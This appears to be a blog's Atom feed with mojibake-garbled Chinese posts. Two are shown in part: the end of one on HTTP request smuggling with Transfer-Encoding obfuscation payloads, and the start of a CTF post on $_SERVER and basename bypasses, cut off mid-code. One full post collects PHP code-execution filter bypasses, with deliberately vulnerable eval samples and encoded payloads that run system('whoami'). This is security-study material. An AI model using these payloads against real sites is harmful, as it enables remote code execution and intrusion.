class="line">\r\n</span><br></pre></td></tr></table></figure><p>è®¤ä¸ºç»“æŸï¼Œç„¶åè½¬å‘ç»™åç«¯æœåŠ¡å™¨å¤„ç†Transfer-Encoding</p><p>åç«¯æœåŠ¡å™¨è¯»åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5c\r\n</span><br></pre></td></tr></table></figure><p>è®¤ä¸ºè¯»å–å®Œæ¯•ï¼Œåé¢æ•°æ®å°±æ˜¯å¦ä¸€ä¸ªè¯·æ±‚</p><p>å…¶ä»–å¯ç”¨äºæ··æ·†çš„payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding[ç©ºæ ¼]: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[ç©ºæ ¼]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><ul><li>ç¦ç”¨ä»£ç†æœåŠ¡å™¨ä¸åç«¯æœåŠ¡å™¨ä¹‹é—´çš„TCPè¿æ¥é‡ç”¨</li><li>ä½¿ç”¨HTTP&#x2F;2åè®®</li><li>å‰åç«¯ä½¿ç”¨ç›¸åŒå‚æ•°</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä»€ä¹ˆæ˜¯HTTPè¯·æ±‚èµ°ç§&quot;&gt;&lt;a href=&quot;#ä»€ä¹ˆæ˜¯HTTPè¯·æ±‚èµ°ç§&quot; class=&quot;headerlink&quot; title=&quot;ä»€ä¹ˆæ˜¯HTTPè¯·æ±‚èµ°ç§&quot;&gt;&lt;/a&gt;ä»€ä¹ˆæ˜¯HTTPè¯·æ±‚èµ°ç§&lt;/h1&gt;&lt;p&gt;HTTPè¯·æ±‚èµ°ç§æ˜¯ä¸€ç§å¹²æ‰°ç½‘ç«™å¤„ç†ä»ä¸€ä¸ªæˆ–å¤šä¸ªç”¨æˆ·æ¥æ”¶çš„HTTPè¯·æ±‚</summary>
      
    
    
    
    
    <category term="http" scheme="http://example.com/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>phpä»£ç æ‰§è¡Œç»•è¿‡æ–¹æ³•æ€»ç»“</title>
    <link href="http://example.com/2023/12/21/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2023/12/21/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</id>
    <published>2023-12-21T12:20:53.000Z</published>
    <updated>2023-12-21T12:24:39.474Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä»£ç æ‰§è¡Œå‡½æ•°"><a href="#ä»£ç æ‰§è¡Œå‡½æ•°" class="headerlink" title="ä»£ç æ‰§è¡Œå‡½æ•°"></a>ä»£ç æ‰§è¡Œå‡½æ•°</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(string $code):mixed</span><br></pre></td></tr></table></figure><p>å°†codeå½“ä½œphpä»£ç æ‰§è¡Œ</p><h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>php5</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(mixed $assertion [,string $description]):bool</span><br></pre></td></tr></table></figure><p>php7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(mixed $assertion [,Throwable $exception]):bool</span><br></pre></td></tr></table></figure><p>assert()ä¼šæ£€æŸ¥æŒ‡å®šçš„assertionï¼Œå¦‚æœassertionæ˜¯å­—ç¬¦ä¸²ï¼Œå°†ä¼šè¢«å½“ä½œä»£ç æ‰§è¡Œ</p><h3 id="preg-replace-e"><a href="#preg-replace-e" class="headerlink" title="preg_replace()+&#x2F;e"></a>preg_replace()+&#x2F;e</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢</p><p>æœç´¢<strong>subject</strong>ä¸­åŒ¹é…<strong>pattern</strong>çš„éƒ¨åˆ†ï¼Œå¹¶ç”¨replacementæ›¿æ¢ã€‚</p><p>å¦‚æœ<strong>pattern</strong>æ¨¡å¼ä¿®é¥°ç¬¦ä½¿ç”¨**&#x2F;e<strong>ï¼Œé‚£ä¹ˆåŒ¹é…æˆåŠŸå</strong>replacement**ä¼šè¢«å½“ä½œä»£ç æ‰§è¡Œ</p><p><img src="/../images/image-20231220221711422.png" alt="image-20231220221711422"></p><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(string $args, string $code):string</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¼ é€’çš„å‚æ•°åˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œå¹¶ä¸ºå…¶è¿”å›å”¯ä¸€çš„åç§°ã€‚</p><p>å¯å¯¹å‚æ•°æˆ–å‡½æ•°ä½“é—­åˆæ³¨å…¥æ¶æ„ä»£ç å¯¼è‡´ä»£ç æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$code</span>=<span class="string">&#x27;echo&#x27;</span>.<span class="variable">$id</span>.<span class="variable">$a</span>.<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="variable">$func</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&quot;;&#125;phpinfo();//</span><br></pre></td></tr></table></figure><h2 id="å¯å›è°ƒå‡½æ•°"><a href="#å¯å›è°ƒå‡½æ•°" class="headerlink" title="å¯å›è°ƒå‡½æ•°"></a>å¯å›è°ƒå‡½æ•°</h2><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map ( callable $callback , array $array , array ...$arrays ) : array</span><br></pre></td></tr></table></figure><p><strong>array_map()<strong>è¿”å›ä¸€ä¸ª</strong>array</strong>ï¼Œæ•°ç»„å†…å®¹ä¸º<strong>array1</strong>çš„å…ƒç´ æŒ‰ç´¢å¼•é¡ºåºä¸ºå‚æ•°è°ƒç”¨<strong>callback</strong>åçš„ç»“æœ(æœ‰æ›´å¤šæ•°ç»„æ—¶è¿˜ä¼šä¼ å…¥arrays)ï¼Œ<strong>callback</strong>å‡½æ•°å½¢å‚çš„æ•°é‡å¿…é¡»åŒ¹é…**array_map()**å®å‚ä¸­æ•°ç»„çš„æ•°é‡ã€‚</p><p><img src="/../images/image-20231220223642972.png" alt="image-20231220223642972"></p><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) : mixed</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°<strong>callback</strong>æ˜¯è¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°</p><p><img src="/../images/image-20231220225437826.png" alt="image-20231220225437826"></p><h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array ( callable $callback , array $param_arr ) : mixed</span><br></pre></td></tr></table></figure><p>æŠŠç¬¬ä¸€ä¸ªå‚æ•°å½“ä½œå›è°ƒå‡½æ•°<strong>callback</strong>è°ƒç”¨ï¼ŒæŠŠå‚æ•°æ•°ç»„<strong>param_arr</strong>å½“ä½œå›è°ƒå‡½æ•°çš„å‚æ•°ä¼ å…¥</p><p><img src="/../images/image-20231220225711603.png" alt="image-20231220225711603"></p><h3 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array</span><br></pre></td></tr></table></figure><p>ä¾æ¬¡å°†<strong>array</strong>æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ä¼ é€’åˆ°<strong>callback</strong>å‡½æ•°ï¼Œå¦‚æœ<strong>callback</strong>å‡½æ•°è¿”å›trueï¼Œåˆ™<strong>array</strong>æ•°ç»„å½“å‰å€¼ä¼šè¢«åŒ…å«åœ¨è¿”å›ç»“æœæ•°ç»„ä¸­ï¼Œæ•°ç»„çš„é”®åä¿æŒä¸å˜ã€‚</p><p><img src="/../images/image-20231220230053947.png" alt="image-20231220230053947"></p><h3 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usort ( array &amp;$array , callable $value_compare_func ) : bool</span><br></pre></td></tr></table></figure><p>å°†ç”¨æˆ·è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°å¯¹æ•°ç»„ä¸­çš„å€¼è¿›è¡Œæ’åºã€‚</p><p>å¦‚æœè¦æ’åºçš„æ•°ç»„éœ€è¦ç”¨ä¸€ç§ä¸å¯»å¸¸çš„æ ‡å‡†è¿›è¡Œæ’åºï¼Œé‚£ä¹ˆåº”è¯¥ä½¿ç”¨æ­¤å‡½æ•°ã€‚</p><p>php&lt;5.6</p><p><img src="/../images/image-20231221154951752.png" alt="image-20231221154951752"></p><p><strong>php&gt;&#x3D;5.6&amp;php&lt;7  å‚æ•°å˜é•¿ç‰¹æ€§</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usort(...$_GET);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221090947163.png" alt="image-20231221090947163"></p><h2 id="å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡"><a href="#å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡" class="headerlink" title="å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡"></a>å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡</h2><p><strong>php&gt;&#x3D;7</strong></p><p><strong>é€‚ç”¨äºç»•è¿‡è¿‡æ»¤å…·ä½“å…³é”®å­—</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/phpinfo|system/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;no hack!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221160046354.png" alt="image-20231221160046354"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(p.h.p.i.n.f.o)();</span><br><span class="line">(sy.(st).em)(whoami);</span><br><span class="line">(sy.(st).em)(who.ami);</span><br><span class="line">(s.y.s.t.e.m)(&quot;whoami&quot;);</span><br></pre></td></tr></table></figure><h2 id="å­—ç¬¦ä¸²è½¬ä¹‰ç»•è¿‡"><a href="#å­—ç¬¦ä¸²è½¬ä¹‰ç»•è¿‡" class="headerlink" title="å­—ç¬¦ä¸²è½¬ä¹‰ç»•è¿‡"></a>å­—ç¬¦ä¸²è½¬ä¹‰ç»•è¿‡</h2><p><strong>PHP&gt;&#x3D;7</strong></p><p>ä»¥å…«è¿›åˆ¶è¡¨ç¤ºçš„[0-7]{1,3}\è½¬ä¹‰å­—ç¬¦ä¼šè‡ªåŠ¨åŒ¹é…byte(å¦‚â€\400â€&#x3D;&#x3D;â€\000â€)</p><p>ä»¥åå…­è¿›åˆ¶è¡¨ç¤ºçš„\x[0-9A-Fa-f]{1,2}\è½¬ä¹‰å­—ç¬¦è¡¨ç¤ºæ³•(å¦‚â€\41â€)</p><p>ä»¥Unicodeè¡¨ç¤ºçš„\u{[0-9A-Fa-f]+}å­—ç¬¦ï¼Œä¼šè¾“å‡ºUTF-8å­—ç¬¦ä¸²</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x70\x68\x70\x69\x6e\x66\x6f&quot;();#phpinfo();</span><br><span class="line">&quot;\163\171\163\164\145\155&quot;(&#x27;whoami&#x27;);#system(&#x27;whoami&#x27;);</span><br><span class="line">&quot;\u&#123;73&#125;\u&#123;79&#125;\u&#123;73&#125;\u&#123;74&#125;\u&#123;65&#125;\u&#123;6d&#125;&quot;(&#x27;id&#x27;);#system(&#x27;whoami&#x27;);</span><br><span class="line">&quot;\163\171\163\164\145\155&quot;(&quot;\167\150\157\141\155\151&quot;);#system(&#x27;whoami&#x27;);</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221192218854.png" alt="image-20231221192218854"></p><h2 id="å¤šæ¬¡ä¼ å‚ç»•è¿‡"><a href="#å¤šæ¬¡ä¼ å‚ç»•è¿‡" class="headerlink" title="å¤šæ¬¡ä¼ å‚ç»•è¿‡"></a>å¤šæ¬¡ä¼ å‚ç»•è¿‡</h2><p><strong>è¿‡æ»¤å¼•å·ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•</strong></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?1=system&amp;2=whoami</span><br><span class="line">POSTï¼š</span><br><span class="line">cmd=$_GET[1]($_GET[2]);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221192738080.png" alt="image-20231221192738080"></p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POSTï¼š</span><br><span class="line">cmd=$_POST[1]($_POST[2]);&amp;1=system&amp;2=whoami</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221193023823.png" alt="image-20231221193023823"></p><p>å¦‚æœphp&gt;7</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">1=system(&#x27;whoami&#x27;);</span><br><span class="line">POST:</span><br><span class="line">cmd=eval($_GET[1]);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221193244064.png" alt="image-20231221193244064"></p><p>å¦‚æœå›è°ƒå‡½æ•°é™åˆ¶é•¿åº¦ï¼Œåœ¨5.6&lt;php&lt;7ä¸­ï¼š</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?1[]=1&amp;1[]=phpinfo()&amp;2=assert</span><br><span class="line">POST:</span><br><span class="line">cmd=usort(...$_GET);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221194557136.png" alt="image-20231221194557136"></p><h2 id="å†…ç½®å‡½æ•°è®¿é—®ç»•è¿‡"><a href="#å†…ç½®å‡½æ•°è®¿é—®ç»•è¿‡" class="headerlink" title="å†…ç½®å‡½æ•°è®¿é—®ç»•è¿‡"></a>å†…ç½®å‡½æ•°è®¿é—®ç»•è¿‡</h2><p><strong>php&gt;&#x3D;7</strong></p><p><strong>get_defined_functions()</strong>:è¿”å›æ‰€æœ‰å·²å®šä¹‰å‡½æ•°çš„æ•°ç»„</p><p>æ³¨æ„ä¸åŒphpç‰ˆæœ¬get_defined_functions()è¿”å›å€¼ä¸åŒ</p><p>è¿™é‡Œä»¥<strong>php7.4.3</strong>ä¸ºä¾‹</p><p>266-&gt;phpinfo</p><p>358-&gt;system</p><p><img src="/../images/image-20231221195549029.png" alt="image-20231221195549029"></p><p><img src="/../images/image-20231221195729256.png" alt="image-20231221195729256"></p><h2 id="URLç¼–ç ç»•è¿‡"><a href="#URLç¼–ç ç»•è¿‡" class="headerlink" title="URLç¼–ç ç»•è¿‡"></a>URLç¼–ç ç»•è¿‡</h2><p>exam:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤æ‰€æœ‰å­—æ¯å’Œæ•°å­—ï¼Œåˆ©ç”¨å–åæ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(urlencode(~&#x27;phpinfo&#x27;));</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br><span class="line">phpinfo()</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221201442771.png" alt="image-20231221201442771"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96);</span><br><span class="line">system(whoami)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221201612330.png" alt="image-20231221201612330"></p><p>å½“<strong>5&lt;&#x3D;php&lt;&#x3D;7.0.9</strong>æ—¶ï¼Œéœ€è¦å†æ‰§è¡Œä¸€æ¬¡æ„é€ å‡ºæ¥çš„å­—ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">$_=(~&#x27;%9E%8C%8C%9A%8D%8B&#x27;);$__=&#x27;_&#x27;.(~&#x27;%AF%B0%AC%AB&#x27;);$___=$$__;$_($___[_]);</span><br><span class="line">POST:</span><br><span class="line">_=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221201753001.png" alt="image-20231221201753001"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ä»£ç æ‰§è¡Œå‡½æ•°&quot;&gt;&lt;a href=&quot;#ä»£ç æ‰§è¡Œå‡½æ•°&quot; class=&quot;headerlink&quot; title=&quot;ä»£ç æ‰§è¡Œå‡½æ•°&quot;&gt;&lt;/a&gt;ä»£ç æ‰§è¡Œå‡½æ•°&lt;/h2&gt;&lt;h3 id=&quot;eval&quot;&gt;&lt;a href=&quot;#eval&quot; class=&quot;headerlink&quot; title=&quot;e</summary>
      
    
    
    
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>$_SERVERå‚æ•°å’Œbasenameå‡½æ•°ç»•è¿‡</title>
    <link href="http://example.com/2023/12/19/post/"/>
    <id>http://example.com/2023/12/19/post/</id>
    <published>2023-12-19T11:15:31.000Z</published>
    <updated>2023-12-19T11:16:33.933Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SERVERå‚æ•°å’Œbasenameå‡½æ•°ç»•è¿‡"><a href="#SERVERå‚æ•°å’Œbasenameå‡½æ•°ç»•è¿‡" class="headerlink" title="$_SERVERå‚æ•°å’Œbasenameå‡½æ•°ç»•è¿‡"></a>$_SERVERå‚æ•°å’Œbasenameå‡½æ•°ç»•è¿‡</h1><h2 id="SERVERå‚æ•°"><a href="#SERVERå‚æ•°" class="headerlink" title="$_SERVERå‚æ•°"></a>$_SERVERå‚æ•°</h2><p>$_SERVERæ˜¯PHPé¢„å®šä¹‰å˜é‡ä¹‹ä¸€ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªåŒ…å«äº†æ³¨å…¥å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)åŠè„šæœ¬ä½ç½®(script location)ä¿¡æ¯çš„æ•°ç»„ã€‚</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://aaa.com/php/index.php/test/foo?username=root</span><br></pre></td></tr></table></figure><p><strong>$_SERVER[â€˜PHP_SELFâ€™]å½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å:</strong></p><p>php&#x2F;index.php&#x2F;test&#x2F;foo</p><p><strong>$_SERVER[â€˜REQUEST_URIâ€™]URIç”¨æ¥æŒ‡å®šè¦è®¿é—®çš„é¡µé¢:</strong> </p><p>php&#x2F;index.php&#x2F;test&#x2F;foo?username&#x3D;root</p><p>å¹¶ä¸”$_SERVER[â€˜REQUEST_URIâ€™]$_SERVER[â€˜REQUEST_URIâ€™]ä¸ä¼šå°†å‚æ•°ä¸­çš„ç‰¹æ®Šç¬¦å·è¿›è¡Œè½¬æ¢ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒå¹¶ä¸ä¼šè¿›è¡ŒURLè§£ç </p><h2 id="basenameå‡½æ•°"><a href="#basenameå‡½æ•°" class="headerlink" title="basenameå‡½æ•°"></a>basenameå‡½æ•°</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">basename(path,suffix)</span><br></pre></td></tr></table></figure><p>è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†</p><p>exam:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$path</span> = <span class="string">&quot;user01/home/documents/geeksforgeeks.php&quot;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>); </span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geeksforgeeks.php</span><br></pre></td></tr></table></figure><h1 id="é¹¤åŸæ¯-2021-EasyP"><a href="#é¹¤åŸæ¯-2021-EasyP" class="headerlink" title="[é¹¤åŸæ¯ 2021]EasyP"></a>[é¹¤åŸæ¯ 2021]EasyP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    <span 